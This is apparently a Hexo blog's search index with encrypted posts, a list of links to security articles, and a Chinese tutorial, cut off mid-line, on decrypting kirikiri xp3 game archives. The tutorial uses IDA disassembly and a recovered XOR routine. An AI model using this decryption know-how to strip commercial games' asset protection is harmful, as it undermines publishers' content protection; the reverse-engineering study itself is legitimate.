<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web | tips</title>
      <link href="/web-tips/"/>
      <url>/web-tips/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dfda299e040eab7fc902766572a44cc4c1bd179b117fe50c03385fcb8c2ce042">709d136fa9ae24571a7ddbf50c1f3897b2b3a0a48d290ee67e67d16cf4bfcc7dae4af63ec70bdc92497041b703cf59d4b914ce4ed17b2ac147c4945374303fba6e0e73934e40eadbf0d21fe8fbf037edf3931b71a11ef76499dab5b61f186155ee9cf4724318151a5d0e972bf36d9481d5204edffe28808ef82ebd9ec495c5b14ba06a3d095f5b6d280b240760a2a6d2964af1cff908f336dce8942b28e1ea06bdddeb45a63728c07bbadc370a611c455be2b4a4d7f05eea7be0404a0cc3dafa3dc266cdb01dc20e18c03e7bd6a47d3091661b237185f937b838f494fa24131812b691c8c8ce89bb8a94bfe49fa8bcea065af039a489338a694192375db4722020b6a9df24fe16ce140882b0be89d8a4913d994a256d99c85af30f35f5f97e37ea80e9d43b3eea4e6e0b298525d8cfde6ac8962cedbea0d63413c3395442d96373e7c9220ff8908c3241d663a56840a33a2766ce1a9d95490879c5413052ea676df14dec7c7541117406ce5b5b053d442d21bfb46065976be5972792b306ac9b140d19d001fe40a2b44092c9a79d46846bd04b587939d0eb0c0de701bf10c361db73ba9ea57c74e2d656139debfc843103b95791c42c8e9082ef7677e602461ac0b5ecff003ca5377b37b0f998c8fe6f72aa17d3164a63c906579ecdeeecb4e39cd54f657329ef9c17a78f93eb12df1c25915c64e822a483af7ca51b26d367acfb9705faf42c51a6a41ae58e756c7ffb0758280266f5f0847f9525442661648228548da7aff139d7eb6aa0baae4afde881dc51b72d8f18e9c8c573dcd901850ee6a9a47e58da23f4c3c033bd7dc2822d4f0b2875497cb3a7ec8a879d6e90489494d7f5cfd959395935c69b39aa77138557b3ce28f686f028d7a8f832349bbc09d8d581cc8f97135268ed6ef78f2fbbd79fc92d2f6ecb834708b2d28b7d2e7da46280df4eb9d7a4a0317255cab6d2d1714167a1cf2b3bc5c63124ff92db36f19e0a698d6200099ea992b011398fcda3c93b8d8aa72f2dc02113143355cea4365e1238189232e8023c305edc033da6cf816b310f7d05c5b35a66c216af47914057658b756e393b4a3d458a1808520a2707522e0f982f753510b19168c54ee805208dd92e640b7f51999c21f3a78f07415c22b6c85bf0e5a8b26f1810844ba22102b3bb852e89f159e53e79ad564a494fffbd6a69170004967c2bda66db4fbe30319cdd16d55be613e9bb9e8d62ded3d7a090593919f55e9224488e92b0ead054a3f20ccb9247d7b5c31fcbfe47e67bee998662367fa97c70467958a9b229c9b4cd2bd29e74bbf3503d3a544af1bbaa45d39fa5b046b8581231c46017f73170d0585607024ad1fad31d96eb6b06b9975f3e18ab3bea7f6a85fb855af88dbbf5e5b77fbbd20392ebbf4b0f3b7eec2465527ba891c061b55144165f04d0f9afe001f9b981726c80d4163006b96dfeb8617a24be4466a7b4bd5253224e9788dbaf4356e1e567feb38db0922ef25bf52f5ac24524627427aebc907fa20f7938e7e8ee09f741ff9a3f31b178fb62d370ad4403abf5cd842b88fbf6e97c63ca9403b1ca87bf03612104d3ad9c9c3268d9a200cbb0ec5c542cab8319e6180b85492cad721552ff983c103290d5b46f1f9cf338067d38d2733cd909816d98c1a363615cfa750f6111457f812665b6a3eeba5f45461106c55887b34a424beb825486cd04a452869aa14d39bff59886c7d4e6d79cec7d3123bb07c8ff2c11dec9ffaf132d937828dd0f002d0e1e655b8515c5598383b275354acfb70c868110c9124e9a31748e674810c1fc2fe87054b8a12682f5f8f7fe90fe20adf9af51d82ad6c750a624a09379aa422a190e6fd45c0d7233382ad4847704b1b8f7e18e80ed25b928b99ae2b202cd0a93b0173a9c49232f5e8407ab96790fc79b23a43aa7de86a967f71880102b57c44a6bd18d0e99992514f82793a352f15bdf9c73793bc60ccc01b9277ae2eed8437968a2782a73229dca1ed9cee88686ed4581c66ad2b7abdd240dbf1b09df7c330562ce5d70aeeb58abdaa009681be1a7eca47e4eefa3ab581d75d6e568736bb845f2635dd48c1bb382982af084d1e5e603e037385a38c1408854489876d73e91b68de20bf7e844ef2e838b599a72d6b41ee948c5b9b04c6173623ef7ee5855829f95acd8b25cb2ad4161cd10b0b84dae628a9df2b045099ae1d6c349ab9cbbfde6236b7c28c4038c511034fb238386e979a1767c6140a3967c07ff82b364d09bcc10ecba68d992cee6f893fe031ee34ae2b77cd15a8d9d502e9858a438a793f4e1f80e644133826115cd5d77c357e970c778a53a51502d064f48af8a220326dc2767f08191b210c7fbc7fcb4433a7576e88066062f7c50a6174b4ebbadf5fdcd0a8884fa3f3b17eb8ef8b61a12a977e5b6576038ff621c5e9536386337f1750ee2fe3446ba751cba8abf75725930ccd0a4be833d5188149287df0dfd27bb126d35510f0e6876e24d583a2d23d62fdceeeaed5c5120d54aac5ed10ef7042bb869ee7db4c0b7f9b1bd3f14f9e6847d8253ffb965fd30d09cead320323c0666bc729815b684548e8aa3b359cbda6a4b13d94c25163a9458771fda14bbb36fcf4dfe17f6b77ba9999406c046cb62265db3a170b66b0b5cb180770844a7609e35dd6a694fffba16e2ada9869f6625eb62846bd24cdc57d823687308c9a735ed56a2c0aae4e6f948ceea42fa7485150d980082dcd1ce43e94d20abfaa450200c59a7088843a8dba93acc7ba0320adfcc06d2e6431851116f9303de607fa7da64605e8ad05d83e4a3c2c0ff21c69a47b3a661f33903fa48ea50833725b9093c7702b29ea5680fa3bd44ba35fa4c1e8ec0e57c822cc0180120cd739ae28baa89c2733d85dad62255710ee91f434db302a15ff30988777d1d4f9c101b1d5528ef91b238382d029b884c585f06455b26ba7911ce56f5e284934366ab52f17e6649fa74220fbdbe5ba8df3aabea26ef3ee3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>校赛逆向题</title>
      <link href="/%E6%A0%A1%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/"/>
      <url>/%E6%A0%A1%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="409438b80b2cba3f4d1776eaba5ea2f6a24f847f67b77fc685a36c2282a48e60"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网摘</title>
      <link href="/%E7%BD%91%E6%91%98/"/>
      <url>/%E7%BD%91%E6%91%98/</url>
      
        <content type="html"><![CDATA[<p>一些网络安全&#x2F;逆向工程 的网(文)摘</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p><a href="https://www.freebuf.com/vuls/339301.html">红队实录系列：从 NodeJS 代码审计到内网突破</a></p><p><a href="https://cloud.tencent.com/developer/article/2288231">SSRF</a></p><p><a href="https://m.freebuf.com/articles/web/339792.html">蓝队 工具 etc</a></p><p><a href="https://teamssix.com/211027-163641.html">内网知识点总结</a></p><p><a href="https://cloud.tencent.com/developer/article/2035863">SESSION_UPLOAD_PROGRESS</a></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>异常处理反调试的本质:<br><img src="/%E7%BD%91%E6%91%98/images/image.png" alt="img"><br><img src="/%E7%BD%91%E6%91%98/images/image-1.png" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xp3逆向</title>
      <link href="/xp3%E9%80%86%E5%90%91/"/>
      <url>/xp3%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>以kirikiri引擎为代表的xp3格式的galgame还挺多的 资料也比较全 适合来练习</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程(?)"></a>教程(?)</h1><p><img src="/xp3%E9%80%86%E5%90%91/images/image.png" alt="img"><br><img src="/xp3%E9%80%86%E5%90%91/images/image-1.png" alt="img"><br><img src="/xp3%E9%80%86%E5%90%91/images/image-2.png" alt="img"><br><img src="/xp3%E9%80%86%E5%90%91/images/image-3.png" alt="img"><br><img src="/xp3%E9%80%86%E5%90%91/images/image-4.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> TVP_tTVPXP3ArchiveExtractionFilter_CONVENTION</span><br><span class="line"><span class="title function_">TVPXP3ArchiveExtractionFilter</span><span class="params">(tTVPXP3ExtractionFilterInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// TVPXP3ArchiveExtractionFilter 関数は本体側から呼び出される</span></span><br><span class="line"><span class="comment">// コールバック関数です。</span></span><br><span class="line"><span class="comment">// 引数を一つ取り、それは tTVPXP3ExtractionFilterInfo 構造体へのポインタ</span></span><br><span class="line"><span class="comment">// です。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// TVPXP3ArchiveExtractionFilter は、後述の V2Link 関数内で</span></span><br><span class="line"><span class="comment">// TVPSetXP3ArchiveExtractionFilter により設定されます。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// ここでは単純に、xp3enc.dll のサンプルで作成された XP3 アーカイブを</span></span><br><span class="line"><span class="comment">// 復号すべく、データをすべて FileHash の最下位バイトで XOR</span></span><br><span class="line"><span class="comment">// することにします。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// この関数は複数のスレッドから同時に呼び出される可能性があるので</span></span><br><span class="line"><span class="comment">// 注意してください。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tTVPXP3ExtractionFilterInfo のメンバは以下の通り</span></span><br><span class="line"><span class="comment">* SizeOfSelf        : 自分自身の構造体のサイズ</span></span><br><span class="line"><span class="comment">* Offset            : &quot;Buffer&quot; メンバが指し示すデータが、</span></span><br><span class="line"><span class="comment">*                   : アーカイブに格納されているそのファイルの先頭からの</span></span><br><span class="line"><span class="comment">*                   : どのオフセット位置からのものか、を表す</span></span><br><span class="line"><span class="comment">* Buffer            : データ本体</span></span><br><span class="line"><span class="comment">* BufferSize        : &quot;Buffer&quot; メンバの指し示すデータのサイズ(バイト単位)</span></span><br><span class="line"><span class="comment">* FileHash          : ファイルの暗号化解除状態でのファイル内容の32bitハッシュ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 一応構造体のサイズをチェックする</span></span><br><span class="line"><span class="keyword">if</span>(info-&gt;SizeOfSelf != <span class="keyword">sizeof</span>(tTVPXP3ExtractionFilterInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 構造体のサイズが違う場合はここでエラーにした方がよい</span></span><br><span class="line">TVPThrowExceptionMessage(TJS_W(<span class="string">&quot;Incompatible tTVPXP3ExtractionFilterInfo size&quot;</span>));</span><br><span class="line"><span class="comment">// TVPThrowExceptionMessage は例外メッセージを投げる関数</span></span><br><span class="line"><span class="comment">// この関数は戻らない ( もっと呼び出し元をさかのぼった位置で</span></span><br><span class="line"><span class="comment">// 例外が補足されるため )</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 復号</span></span><br><span class="line">tjs_uint i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; info-&gt;BufferSize; i++)</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)info-&gt;Buffer)[i] ^= info-&gt;FileHash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//------------</span></span><br></pre></td></tr></table></figure><p><img src="/xp3%E9%80%86%E5%90%91/images/image-5.png" alt="img"><br><img src="/xp3%E9%80%86%E5%90%91/images/image-6.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tTVPXP3ExtractionFilterInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">const</span> tjs_uint SizeOfSelf; <span class="comment">// structure size of tTVPXP3ExtractionFilterInfo itself 4个字节 0-3</span></span><br><span class="line"><span class="type">const</span> tjs_uint64 Offset; <span class="comment">// offset of the buffer data in uncompressed stream position 8个字节 4-11</span></span><br><span class="line"><span class="type">void</span> * Buffer; <span class="comment">// target data buffer 4个字节 12-15</span></span><br><span class="line"><span class="type">const</span> tjs_uint BufferSize; <span class="comment">// buffer size in bytes pointed by &quot;Buffer&quot; 16-19</span></span><br><span class="line"><span class="type">const</span> tjs_uint32 FileHash; <span class="comment">// hash value of the file (since inteface v2)</span></span><br><span class="line"> </span><br><span class="line">tTVPXP3ExtractionFilterInfo(tjs_uint64 offset, <span class="type">void</span> *buffer,</span><br><span class="line">tjs_uint buffersize, tjs_uint32 filehash) :</span><br><span class="line">Offset(offset), Buffer(buffer), BufferSize(buffersize),</span><br><span class="line">FileHash(filehash),</span><br><span class="line">SizeOfSelf(<span class="keyword">sizeof</span>(tTVPXP3ExtractionFilterInfo)) &#123;;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/xp3%E9%80%86%E5%90%91/images/image-7.png" alt="img"><br>解密算法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> TVP_tTVPXP3ArchiveExtractionFilter_CONVENTION</span><br><span class="line"><span class="title function_">TVPXP3ArchiveExtractionFilter</span><span class="params">(tTVPXP3ExtractionFilterInfo *info)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// TVPXP3ArchiveExtractionFilter 函数是会从吉里吉里本体调用的回调函数。</span></span><br><span class="line"><span class="comment">// 能得到的参数只有一个，就是对 tTVPXP3ExtractionFilterInfo 结构体的指针。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// TVPXP3ArchiveExtractionFilter 需要在后述的 V2Link 函数内使用</span></span><br><span class="line"><span class="comment">// 吉里吉里本体的 TVPSetXP3ArchiveExtractionFilter 函数设定。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 这个样例只是纯粹的对 xp3enc.dll 样例代码加密的 XP3 文件包解密</span></span><br><span class="line"><span class="comment">// 将所有的数据以 FileHash 的最后一个字节作异或（XOR）运算</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 请注意，这个函数有可能在多个线程中被调用。</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tTVPXP3ExtractionFilterInfo 的成员如下</span></span><br><span class="line"><span class="comment">* SizeOfSelf        : 结构体自身的大小</span></span><br><span class="line"><span class="comment">* Offset            : &quot;Buffer&quot; 成员所指向的数据偏离这个文件头部的偏移值</span></span><br><span class="line"><span class="comment">* Buffer            : 数据本体</span></span><br><span class="line"><span class="comment">* BufferSize        : &quot;Buffer&quot; 成员所指向的数据的大小（字节单位）</span></span><br><span class="line"><span class="comment">* FileHash          : 解密后文件内容的32位 Hash （散列）值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检查结构体的大小</span></span><br><span class="line"><span class="keyword">if</span>(info-&gt;SizeOfSelf != <span class="keyword">sizeof</span>(tTVPXP3ExtractionFilterInfo))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 当结构体的大小错误，则最好投出异常</span></span><br><span class="line">TVPThrowExceptionMessage(TJS_W(<span class="string">&quot;Incompatible tTVPXP3ExtractionFilterInfo size&quot;</span>));</span><br><span class="line"><span class="comment">// TVPThrowExceptionMessage 是用于投出异常的函数</span></span><br><span class="line"><span class="comment">// 本函数不会返回。</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// yourdiary 解密代码 by大师♂罗庄</span></span><br><span class="line"><span class="comment">//ext:10001033 loc_10001033:                           ; CODE XREF: .text:10001049j</span></span><br><span class="line"><span class="comment">//.text:10001033                 mov     ecx, [esi+0Ch] //Buffer[i]</span></span><br><span class="line"><span class="comment">//.text:10001036                 mov     dl, [ecx+eax]//Buffer[i]</span></span><br><span class="line"><span class="comment">//.text:10001039                 xor     dl, [esi+14h] //FileHash</span></span><br><span class="line"><span class="comment">//.text:1000103C                 add     ecx, eax</span></span><br><span class="line"><span class="comment">//.text:1000103E                 xor     dl, 0CDh</span></span><br><span class="line"><span class="comment">//.text:10001041                 add     eax, 1</span></span><br><span class="line"><span class="comment">//.text:10001044                 mov     [ecx], dl</span></span><br><span class="line"><span class="comment">//.text:10001046                 cmp     eax, [esi+10h]//循环比较BufferSize</span></span><br><span class="line"><span class="comment">//.text:10001049                 jb      short loc_10001033</span></span><br><span class="line"><span class="comment">//.text:1000104B</span></span><br><span class="line"><span class="comment">//.text:1000104B loc_1000104B:                           ; CODE XREF: .text:10001031j</span></span><br><span class="line"><span class="comment">//.text:1000104B                 pop     esi</span></span><br><span class="line"><span class="comment">//.text:1000104C                 retn    4</span></span><br><span class="line"><span class="comment">//.text:1000104C ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//.text:1000104F                 align 10h</span></span><br><span class="line">tjs_uint i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; info-&gt;BufferSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  v4 =((<span class="type">unsigned</span> <span class="type">char</span> *)info-&gt;Buffer)[i] ;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>  v5 =info-&gt;FileHash^ (v4);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> result ;</span><br><span class="line">result = v5 ^ <span class="number">0xCD</span>;</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)info-&gt;Buffer)[i]  =result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p><img src="/xp3%E9%80%86%E5%90%91/images/image-8.png" alt="img"></p><h1 id="实操复现"><a href="#实操复现" class="headerlink" title="实操复现"></a>实操复现</h1><p>但要找到有.tmp文件的游戏有点难…<br>最初找的 <code>不败世界与终焉之花</code> plugins目录下就没有<br>但无妨 逆向本就不需要引擎源码…</p><h2 id="your-diary"><a href="#your-diary" class="headerlink" title="your diary"></a>your diary</h2><p>下好游戏 在plugin目录下看到 <code>.tpm</code>文件<br>die看看确实是一个dll 改了个后缀罢了…<br>而且在导出表部分发现是以  <code>xp3dec.tpm</code>的name</p><p>一样的对游戏执行exe设好三个条件断点</p><p>CreateFile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件读取:  &#123;utf16@[esp+4]&#125;</span><br></pre></td></tr></table></figure><p>ReadFile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取文件: 句柄:&#123;[esp+4]&#125;  缓冲:&#123;[esp+8]&#125;  字节数:&#123;[esp+C]&#125;</span><br></pre></td></tr></table></figure><p>SetFilePointer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置文件指针: 句柄:&#123;[esp+4]&#125;  偏移量:&#123;[[esp+C]]&#125;&#123;[esp+8]&#125;  基准:&#123;[esp+10]&#125;</span><br></pre></td></tr></table></figure><p>这里要改为 <code>utf8</code>才能正常显示</p><p>然而这题由于是调用的dll来解密 不像万华镜是直接引擎解密 所以这样下断点分析很难看出端倪<br>那就从.tpm入手 string找到关键字符串<br><code>void ::TVPSetXP3ArchiveExtractionFilter(tTVPXP3ArchiveExtractionF</code><br>交叉引用找到<code>V2Link</code>部分 正是dll的导出函数<br><img src="/xp3%E9%80%86%E5%90%91/images/image-10.png" alt="img"><br>逐个跟踪 跟踪到这个<code>push    offset loc_10001000</code><br>点过去发现IDA并没有完全识别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">10001000</span> loc_10001000:                           ; DATA XREF: V2Link:loc_10001078↓o</span><br><span class="line">.text:<span class="number">10001000</span>                 push    esi</span><br><span class="line">.text:<span class="number">10001001</span>                 mov     esi, [esp+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">10001005</span>                 cmp     dword ptr [esi], <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">10001008</span>                 jz      <span class="type">short</span> loc_1000102C</span><br><span class="line">.text:<span class="number">1000100</span>A                 mov     eax, dword_1000C2CC</span><br><span class="line">.text:<span class="number">1000100F</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">10001011</span>                 jnz     <span class="type">short</span> loc_10001025</span><br><span class="line">.text:<span class="number">10001013</span>                 push    offset aVoidTvpthrowex ; <span class="string">&quot;void ::TVPThrowExceptionMessage(const t&quot;</span>...</span><br><span class="line">.text:<span class="number">10001018</span>                 call    sub_100010C0</span><br><span class="line">.text:<span class="number">1000101</span>D                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">10001020</span>                 mov     dword_1000C2CC, eax</span><br><span class="line">.text:<span class="number">10001025</span></span><br><span class="line">.text:<span class="number">10001025</span> loc_10001025:                           ; CODE XREF: .text:<span class="number">10001011</span>↑j</span><br><span class="line">.text:<span class="number">10001025</span>                 push    offset aIncompatibleTt ; <span class="string">&quot;Incompatible tTVPXP3ExtractionFilterInf&quot;</span>...</span><br><span class="line">.text:<span class="number">1000102</span>A                 call    eax ; dword_1000C2CC</span><br><span class="line">.text:<span class="number">1000102</span>C</span><br><span class="line">.text:<span class="number">1000102</span>C loc_1000102C:                           ; CODE XREF: .text:<span class="number">10001008</span>↑j</span><br><span class="line">.text:<span class="number">1000102</span>C                 xor     eax, eax</span><br><span class="line">.text:<span class="number">1000102</span>E                 cmp     [esi+<span class="number">10</span>h], eax</span><br><span class="line">.text:<span class="number">10001031</span>                 jbe     <span class="type">short</span> loc_1000104B</span><br><span class="line">.text:<span class="number">10001033</span></span><br><span class="line">.text:<span class="number">10001033</span> loc_10001033:                           ; CODE XREF: .text:<span class="number">10001049</span>↓j</span><br><span class="line">.text:<span class="number">10001033</span>                 mov     ecx, [esi+<span class="number">0</span>Ch]</span><br><span class="line">.text:<span class="number">10001036</span>                 mov     dl, [ecx+eax]</span><br><span class="line">.text:<span class="number">10001039</span>                 xor     dl, [esi+<span class="number">14</span>h]</span><br><span class="line">.text:<span class="number">1000103</span>C                 add     ecx, eax</span><br><span class="line">.text:<span class="number">1000103</span>E                 xor     dl, <span class="number">0</span>CDh</span><br><span class="line">.text:<span class="number">10001041</span>                 add     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">10001044</span>                 mov     [ecx], dl</span><br><span class="line">.text:<span class="number">10001046</span>                 cmp     eax, [esi+<span class="number">10</span>h]</span><br><span class="line">.text:<span class="number">10001049</span>                 jb      <span class="type">short</span> loc_10001033</span><br><span class="line">.text:<span class="number">1000104B</span></span><br><span class="line">.text:<span class="number">1000104B</span> loc_1000104B:                           ; CODE XREF: .text:<span class="number">10001031</span>↑j</span><br><span class="line">.text:<span class="number">1000104B</span>                 pop     esi</span><br><span class="line">.text:<span class="number">1000104</span>C                 retn    <span class="number">4</span></span><br><span class="line">.text:<span class="number">1000104</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">1000104F</span>                 align <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">10001050</span> ; Exported entry   <span class="number">1.</span> V2Link</span><br></pre></td></tr></table></figure><p><img src="/xp3%E9%80%86%E5%90%91/images/image-11.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tTVPXP3ExtractionFilterInfo のメンバは以下の通り</span></span><br><span class="line"><span class="comment">* SizeOfSelf        : 自分自身の構造体のサイズ</span></span><br><span class="line"><span class="comment">* Offset            : &quot;Buffer&quot; メンバが指し示すデータが、</span></span><br><span class="line"><span class="comment">*                   : アーカイブに格納されているそのファイルの先頭からの</span></span><br><span class="line"><span class="comment">*                   : どのオフセット位置からのものか、を表す</span></span><br><span class="line"><span class="comment">* Buffer            : データ本体</span></span><br><span class="line"><span class="comment">* BufferSize        : &quot;Buffer&quot; メンバの指し示すデータのサイズ(バイト単位)</span></span><br><span class="line"><span class="comment">* FileHash          : ファイルの暗号化解除状態でのファイル内容の32bitハッシュ</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>逆向经验知道esi经常来传结构体 汇编已经很清晰了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[esi+<span class="number">0xC</span>]: 数组偏移 DWORD</span><br><span class="line">[esi+<span class="number">0x10</span>]:size DWORD</span><br><span class="line">[esi+<span 